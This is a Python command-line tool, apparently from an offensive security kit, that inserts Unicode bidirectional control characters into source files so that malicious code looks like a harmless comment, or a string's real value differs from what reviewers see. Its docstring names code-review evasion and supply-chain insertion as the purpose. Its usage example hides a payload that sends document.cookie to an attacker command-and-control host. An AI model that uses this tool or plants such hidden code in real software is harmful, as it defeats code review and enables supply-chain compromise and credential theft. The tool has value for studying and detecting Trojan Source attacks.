"""
bidi_inject — plant hidden code in a source file using bidi controls.

Operator use case: code-review evasion / supply-chain insertion against
a target file YOU CONTROL or have authorization to modify. Produces a
file whose rendered text reads as benign comments / strings while the
actual bytes the parser sees include the live attacker-controlled code.

Two modes:

  comment-veil    Comment-wrap a malicious line with bidi controls so it
                  renders as a benign comment in editors, but the parser
                  still executes it. This works in languages with C-style
                  /* */ block comments (C, C++, Java, JavaScript, Go, Rust).

  string-stretch  Embed bidi controls inside a STRING LITERAL so the value
                  stored at runtime is longer / different from what a
                  reviewer sees rendered. Works in any language; the actual
                  exploit is a downstream comparison/check (see PoC 01).

The tool only PRODUCES the modified source. It doesn't commit or run it.

Usage:
    # Hide a JS line behind what looks like an innocent comment
    python tools/bidi_inject.py comment-veil \\
        --in app.js --payload "fetch('//attacker/c2?'+document.cookie)" \\
        --cover "TODO: refactor this section"

    # Stretch a Python string literal so its value diverges from the render
    python tools/bidi_inject.py string-stretch \\
        --in config.py --var ROLE --visible "user" --actual "admin"

    # Print to stdout instead of writing in-place
    python tools/bidi_inject.py comment-veil --in app.js \\
        --payload "..." --cover "..." -o -
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

RLO = "‮"  # Right-to-Left Override
LRO = "‭"  # Left-to-Right Override
LRI = "⁦"  # Left-to-Right Isolate
RLI = "⁧"  # Right-to-Left Isolate
PDI = "⁩"  # Pop Directional Isolate
PDF = "‬"  # Pop Directional Formatting


def comment_veil(payload: str, cover: str) -> str:
    """
    Produce a C-style line that LOOKS like a single-line comment but is
    actually executable code followed by a comment. Pattern:

        bytes:    <payload>; /* RLO <cover> PDF */
        render:   /* <cover> */ ;<payload>;     (visually flipped)

    A reviewer sees "/* TODO: refactor this section */" and moves on.
    The compiler/parser sees <payload>; first.
    """
    return f"{payload}; /*{RLO} {cover} {PDF}*/"


def string_stretch(visible: str, actual: str) -> str:
    """
    Build a string literal that renders as `"visible"` but holds
    `"<visible><RLO> ; <hidden_actual> <PDI><LRI>"` at runtime.

    Use case: a downstream `if x == "visible":` check fails, so the
    code falls through to whatever else-branch the attacker controls.
    Identical mechanic to pocs/01_bidi_trojan_source.py.
    """
    return f'"{visible}{RLO} {LRI}# {actual}{PDI} {LRI}"'


def inject_line(src: Path, new_line: str, marker: str | None, dst: Path | None) -> None:
    """
    Insert new_line into src. If marker is provided, insert AFTER the
    first line containing the marker; otherwise prepend at the top
    (after any shebang / encoding declaration).
    """
    text = src.read_text(encoding="utf-8")
    lines = text.splitlines(keepends=True)

    insert_at = 0
    if lines and lines[0].startswith("#!"):
        insert_at = 1
    if len(lines) > insert_at and "coding" in lines[insert_at]:
        insert_at += 1

    if marker:
        for i, ln in enumerate(lines):
            if marker in ln:
                insert_at = i + 1
                break

    lines.insert(insert_at, new_line.rstrip("\n") + "\n")
    out = "".join(lines)

    if dst is None:
        sys.stdout.write(out)
    else:
        dst.write_text(out, encoding="utf-8")
        print(f"[+] wrote {dst} ({len(out)} bytes)", file=sys.stderr)


def cmd_comment_veil(args: argparse.Namespace) -> int:
    line = comment_veil(args.payload, args.cover)
    out = None if args.out == "-" else Path(args.out or args.in_path)
    inject_line(Path(args.in_path), line, args.after, out)
    if args.show_bytes:
        print("\n--- line bytes ---", file=sys.stderr)
        print(line.encode("utf-8").hex(" "), file=sys.stderr)
    return 0


def cmd_string_stretch(args: argparse.Namespace) -> int:
    literal = string_stretch(args.visible, args.actual)
    line = f"{args.var} = {literal}"
    out = None if args.out == "-" else Path(args.out or args.in_path)
    inject_line(Path(args.in_path), line, args.after, out)
    if args.show_bytes:
        print("\n--- line bytes ---", file=sys.stderr)
        print(line.encode("utf-8").hex(" "), file=sys.stderr)
    return 0


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(description="Plant bidi-hidden code in a source file.")
    sub = p.add_subparsers(dest="mode", required=True)

    veil = sub.add_parser("comment-veil", help="hide code behind a fake C-style comment")
    veil.add_argument("--in", dest="in_path", required=True, help="source file to modify")
    veil.add_argument("--payload", required=True, help="real code that will execute")
    veil.add_argument("--cover", required=True, help="benign text the reviewer will see")
    veil.add_argument("--after", help="insert after the first line containing this string")
    veil.add_argument("-o", "--out", help="output path (- for stdout). default: overwrite --in")
    veil.add_argument("--show-bytes", action="store_true", help="dump hex of injected line to stderr")
    veil.set_defaults(func=cmd_comment_veil)

    stretch = sub.add_parser("string-stretch", help="hide a longer string value behind a short rendering")
    stretch.add_argument("--in", dest="in_path", required=True)
    stretch.add_argument("--var", required=True, help="variable name to assign")
    stretch.add_argument("--visible", required=True, help="what a reviewer will see between the quotes")
    stretch.add_argument("--actual", required=True, help="extra content embedded after the bidi flip")
    stretch.add_argument("--after", help="insert after the first line containing this string")
    stretch.add_argument("-o", "--out", help="output path (- for stdout). default: overwrite --in")
    stretch.add_argument("--show-bytes", action="store_true")
    stretch.set_defaults(func=cmd_string_stretch)

    args = p.parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
